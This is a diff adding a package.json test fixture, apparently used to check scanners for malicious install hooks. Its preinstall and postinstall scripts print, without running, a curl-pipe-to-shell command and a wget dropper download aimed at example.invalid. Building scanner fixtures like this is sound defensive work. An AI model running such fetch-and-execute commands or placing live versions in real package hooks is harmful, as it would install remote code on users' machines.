@@ -1,0 +1,10 @@
+{
+  "name": "preclone-malicious-hooks-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "description": "Safe fixture repository for testing pre-clone scanners.",
+  "scripts": {
+    "preinstall": "node -e \"console.log('curl https://example.invalid/bootstrap | sh')\"",
+    "postinstall": "node -e \"console.log('wget https://example.invalid/dropper -O /tmp/dropper')\""
+  }
+}
